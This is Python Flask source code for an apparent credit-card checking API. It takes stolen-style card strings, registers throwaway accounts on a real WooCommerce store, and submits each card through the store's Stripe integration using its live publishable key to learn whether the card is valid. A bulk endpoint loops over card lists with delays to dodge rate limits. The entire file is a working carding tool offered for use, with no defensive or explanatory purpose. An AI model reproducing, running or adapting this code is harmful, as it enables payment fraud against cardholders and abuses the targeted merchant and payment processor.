from flask import Flask, request, jsonify
import requests, re, random, json
from bs4 import BeautifulSoup
import threading
import time

app = Flask(__name__)

class PaymentGatewayProcessor:
    def __init__(self, card_information_string):
        self.card_data = self._parse_card_data(card_information_string)
        self.session_manager = requests.Session()
        self.temporary_username = self._generate_random_username()
        self.registration_success = False
        self.payment_method_id = None
        self.setup_intent_result = None

    def _parse_card_data(self, card_string):
        components = card_string.strip().split("|")
        if len(components) < 4:
            return None
        return {
            'card_number': components[0],
            'expiration_month': components[1],
            'expiration_year': components[2],
            'security_code': components[3]
        }

    def _generate_random_username(self):
        character_set = '1234567890qwertyuiopasdfghjklzxcvbnm'
        return ''.join(random.choices(character_set, k=12))

    def _create_user_agent(self):
        version = random.randint(137, 140)
        return f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Mobile Safari/537.36'

    def _get_registration_nonce(self):
        try:
            initial_response = self.session_manager.get(
                'https://tourshafts.com/my-account/', 
                headers={'User-Agent': self._create_user_agent()}
            )
            match_result = re.search(
                r'name="woocommerce-register-nonce" value="(.*?)"', 
                initial_response.text
            )
            return match_result.group(1) if match_result else None
        except Exception:
            return None

    def _register_temporary_account(self):
        registration_nonce = self._get_registration_nonce()
        if not registration_nonce:
            return False
        data = {
            'email': f"{self.temporary_username}@gmail.com",
            'wc_order_attribution_type': 'typein',
            'wc_order_attribution_url': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_session_entry': 'https://tourshafts.com/',
            'wc_order_attribution_session_start_time': '2025-07-30 10:30:23',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'mailchimp_woocommerce_newsletter': '1',
            'woocommerce-register-nonce': registration_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        registration_response = self.session_manager.post(
            'https://tourshafts.com/my-account/', 
            data=data,
            headers={
                'authority': 'tourshafts.com',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://tourshafts.com',
                'referer': 'https://tourshafts.com/my-account/',
                'user-agent': self._create_user_agent(),
            }
        )
        return registration_response.status_code == 200

    def _get_payment_nonce(self):
        try:
            payment_page_response = self.session_manager.get(
                'https://tourshafts.com/my-account/add-payment-method/', 
                headers={'User-Agent': self._create_user_agent()}
            )
            nonce_matches = re.findall(
                r'"add_card_nonce":"(.*?)"', 
                payment_page_response.text
            )
            return nonce_matches[0] if nonce_matches else None
        except Exception:
            return None

    def _create_stripe_payment_method(self):
        if not self.card_data:
            return None
        data = {
            'type': "card",
            'billing_details[name]': " ",
            'billing_details[email]': f"{self.temporary_username}@gmail.com",
            'card[number]': self.card_data['card_number'],
            'card[cvc]': self.card_data['security_code'],
            'card[exp_month]': self.card_data['expiration_month'],
            'card[exp_year]': self.card_data['expiration_year'],
            'guid': "NA",
            'muid': "633b7256-45e3-4345-bf71-cfbcaa004f12541f93",
            'sid': "1ab84ea7-e450-4ee6-9101-009ed9f89148184166",
            'payment_user_agent': "stripe.js/454062d83b; stripe-js-v3/454062d83b; split-card-element",
            'referrer': "https://tourshafts.com",
            'time_on_page': "9178",
            'client_attribution_metadata[client_session_id]': "7892c0c2-62ca-4f13-be21-51c3d7d936de",
            'client_attribution_metadata[merchant_integration_source]': "elements",
            'client_attribution_metadata[merchant_integration_subtype]': "card-element",
            'client_attribution_metadata[merchant_integration_version]': "2017",
            'key': "pk_live_mXkZyoWtRXTA7IR4OEqX5auk00Xb8vfP3O"
        }
        headers = {
            'User-Agent': self._create_user_agent(),
            'Accept': "application/json",
            'origin': "https://js.stripe.com",
            'referer': "https://js.stripe.com/",
        }
        response = requests.post(
            "https://api.stripe.com/v1/payment_methods", 
            data=data, 
            headers=headers
        )
        if 'id' not in response.text:
            return None
        return response.json()['id']

    def _create_setup_intent(self, payment_method_id):
        payment_nonce = self._get_payment_nonce()
        if not payment_nonce:
            return None
        data = {
            'stripe_source_id': payment_method_id,
            'nonce': payment_nonce
        }
        headers = {
            'User-Agent': self._create_user_agent(),
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'x-requested-with': "XMLHttpRequest",
            'origin': "https://tourshafts.com",
            'referer': "https://tourshafts.com/my-account/add-payment-method/",
        }
        response = self.session_manager.post(
            "https://tourshafts.com?wc-ajax=wc_stripe_create_setup_intent", 
            data=data, 
            headers=headers
        )
        try:
            return response.json()
        except:
            return None

    def process_payment(self):
        if not self.card_data:
            return {"status": "error", "message": "Invalid card format"}
        if not self._register_temporary_account():
            return {"status": "error", "message": "Account registration failed"}
        self.payment_method_id = self._create_stripe_payment_method()
        if not self.payment_method_id:
            return {"status": "error", "message": "Payment method creation failed"}
        self.setup_intent_result = self._create_setup_intent(self.payment_method_id)
        if not self.setup_intent_result:
            return {"status": "error", "message": "Setup intent creation failed"}
        if self.setup_intent_result.get('status') == 'success':
            return {"status": "success", "message": "Approved"}
        else:
            return {"status": "error", "message": self.setup_intent_result.get('error', {}).get('message', 'Unknown error')}

@app.route('/')
def home():
    return jsonify({
        "status": "success",
        "message": "Welcome to HP LVL API",
        "endpoints": {
            "/check": "POST - Check a single card (send JSON with 'card' field)",
            "/bulk_check": "POST - Check multiple cards (send JSON with 'cards' array)"
        }
    })

@app.route('/check', methods=['POST'])
def check_card():
    data = request.get_json()
    if not data or 'card' not in data:
        return jsonify({"status": "error", "message": "No card data provided"}), 400
    
    processor = PaymentGatewayProcessor(data['card'])
    result = processor.process_payment()
    return jsonify(result)

@app.route('/bulk_check', methods=['POST'])
def bulk_check():
    data = request.get_json()
    if not data or 'cards' not in data or not isinstance(data['cards'], list):
        return jsonify({"status": "error", "message": "No cards data provided or invalid format"}), 400
    
    results = []
    for card in data['cards']:
        processor = PaymentGatewayProcessor(card)
        result = processor.process_payment()
        results.append({
            "card": card,
            "result": result
        })
        time.sleep(3)  # To avoid rate limiting
    
    return jsonify({"status": "success", "results": results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
